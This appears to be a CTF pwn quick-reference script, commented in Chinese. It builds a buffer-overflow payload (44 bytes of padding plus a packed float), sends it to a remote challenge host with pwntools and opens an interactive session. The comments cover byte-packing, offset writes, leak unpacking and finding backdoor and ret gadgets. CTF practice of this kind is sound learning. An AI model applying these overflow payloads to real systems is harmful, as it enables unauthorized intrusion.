"""Pwn 做题速查。先看目标怎么读输入，再从下面选写法，替换 build_payload() 里的字段。"""

import struct

from pwn import context, remote


def build_payload():
    # 原题布局：前 44 字节填充，接下来 4 字节覆盖一个小端 float。
    field = struct.pack("<f", 11.28125)  # 内存中的字节依次为 00 80 34 41
    return b"a" * 44 + field


# 1. 整数和地址：格式前缀 < 小端，> 大端，! 网络字节序（大端）。
#    b/B、h/H、i/I、q/Q 分别占 1、2、4、8 字节，小写有符号，大写无符号。
# field = struct.pack("<i", -1)           # 有符号 int32，得到 ff ff ff ff
# field = struct.pack("<I", 0xDEADBEEF)   # uint32 或 32 位地址，得到 ef be ad de
# field = struct.pack("<Q", 0x401234)     # amd64 指针，写满 8 字节
# field = struct.pack("!H", 8080)         # 网络协议的 16 位端口，得到 1f 90
# field = (0x123456).to_bytes(3, "little")  # 24 位字段，得到 56 34 12
#
# pwntools 简写（用到哪项就导入哪项，下面按 main 中的 amd64 小端环境举例）：
# from pwn import p8, p16, p32, p64, u32, u64, flat
# field = p32(0xDEADBEEF)                # p8/p16/p32/p64 分别写 1/2/4/8 字节
# field = p32(-1, signed=True)           # 负数要指定有符号
# field = p64(0x401234)[:2]              # 取地址低两字节做部分覆盖，高位须已匹配

# 2. 浮点数：按目标变量类型选 f（4 字节 float）或 d（8 字节 double）。
# field = struct.pack("<d", 11.28125)     # 同一个数，double 与 float 的字节布局不同
# field = struct.pack("<f", float("inf")) # 正无穷，负无穷用 float("-inf")
# field = struct.pack("<f", float("nan")) # NaN，与自身做 == 比较也为假
# field = struct.pack("<I", 0x80000000)   # 精确指定 float 位模式，此处表示 -0.0

# 3. 文本、原始字节和定长字段：先看题目用 scanf 解析，还是用 read 接收。
# field = b"11.28125"                    # scanf("%f") 读十进制文本时发送这个
# field = str(0x401234).encode("ascii")  # scanf("%d") 读十进制整数时发送这个
# field = bytes.fromhex("00 80 34 41")   # 已知内存字节时可直接填写，包含一个 NUL
# field = struct.pack("<8s", b"flag")    # char[8] 右补零，超长会截断；填满时无结尾 NUL
# field = b"/bin/sh\x00"                  # 显式给 C 字符串加终止符

# 4. 多字段和偏移：先对照反编译结果确认每个成员的偏移。
# field = struct.pack("<B3xIf", 1, 7, 1.5)  # 1 字节标志、3 字节填充、uint32、float
# size = struct.calcsize("<B3xIf")          # 12 字节；用 < 时需要显式写出填充
# payload = flat({44: p32(7), 56: p64(0x401234)}, filler=b"A")  # 在两个偏移分别写入
# buf = bytearray(b"A" * 64)
# struct.pack_into("<Q", buf, 56, 0x401234)  # 原地改第 56～63 字节，缓冲区要足够长
# payload = bytes(buf)

# 5. 反向解包：区分程序打印的地址和直接泄漏的内存。
# value, = struct.unpack("<f", bytes.fromhex("00 80 34 41"))  # 得到 11.28125
# addr = int(b"0x401234", 16)                # %p 打印的地址，可换成 p.recvline().strip()
# addr = u64(p.recvn(8))                     # 直接读完整的 8 字节小端指针
# addr = u64(p.recvn(6).ljust(8, b"\x00"))   # 仅当泄漏低 6 字节且已知高 2 字节为零
# count = u32(p.recvn(4))                    # 4 字节小端无符号整数


def main():
    context(os="linux", arch="amd64", log_level="debug")
    p = remote("node4.anna.nssnode.cn", 26943)
    # 从题目 ELF 取符号和 gadget（按实际路径及符号名修改）：
    # from pwn import ELF, ROP
    # elf = ELF("temp/giftpwn")
    # backdoor = elf.symbols["gift"]
    # ret = ROP(elf).find_gadget(["ret"]).address
    payload = build_payload()
    # 按题目选一条发送方式：sendline 末尾加换行，send 原样发送。
    # p.send(payload)
    # p.sendlineafter(b"please input", payload)  # 先等提示，再发送一行
    p.sendline(payload)
    p.interactive()


if __name__ == "__main__":
    main()
